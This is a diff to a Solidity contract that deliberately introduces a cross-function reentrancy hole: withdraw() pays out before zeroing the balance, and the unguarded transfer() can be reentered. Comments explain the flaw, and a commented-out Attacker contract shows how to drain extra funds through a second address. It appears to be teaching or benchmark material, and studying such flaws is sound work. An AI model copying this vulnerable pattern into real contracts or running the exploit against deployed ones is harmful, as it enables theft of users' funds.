@@ -13,17 +13,21 @@ contract C {
         flag = false;
     }
 
+    // this function is not protected by the modifier
+    // so an attacker can reenter after the external call below and move the amount in balances[msg.sender] to another address (parameter 'to') owned by the attacker
+    // a subsequent invocation of withdraw() performed by 'to' will receive money that the attacker never deposited
     function transfer(address to, uint256 amt) public {
         require(balances[msg.sender] >= amt, "Insufficient funds");
         balances[to] += amt;
         balances[msg.sender] -= amt;
     }
 
-    function withdraw(uint256 amt) nonReentrant public {
-        require(balances[msg.sender] >= amt, "Insufficient funds");
+    function withdraw() nonReentrant public {
+        uint amt = balances[msg.sender];
+        require(amt > 0, "Insufficient funds");
         (bool success, ) = msg.sender.call{value:amt}("");
         require(success, "Call failed");
-        balances[msg.sender] -= amt;
+        balances[msg.sender] = 0;
     }
 
     function deposit() nonReentrant public payable {
@@ -31,3 +35,20 @@ contract C {
     }
 
 }
+
+// contract Attacker {
+//     C private c;
+//     address to;
+//     constructor(address v, address _to) {
+//         to = _to;
+//         c = C(v);
+//     }
+//     function attacker() public {
+//         c.deposit{value: 100}();
+//         c.withdraw();
+//         // now, if the address 'to' calls withdraw() then both the attacker and 'to' will own 100 each
+//     }
+//     receive() external payable {
+//         c.transfer(to, 100);
+//     } 
+// }
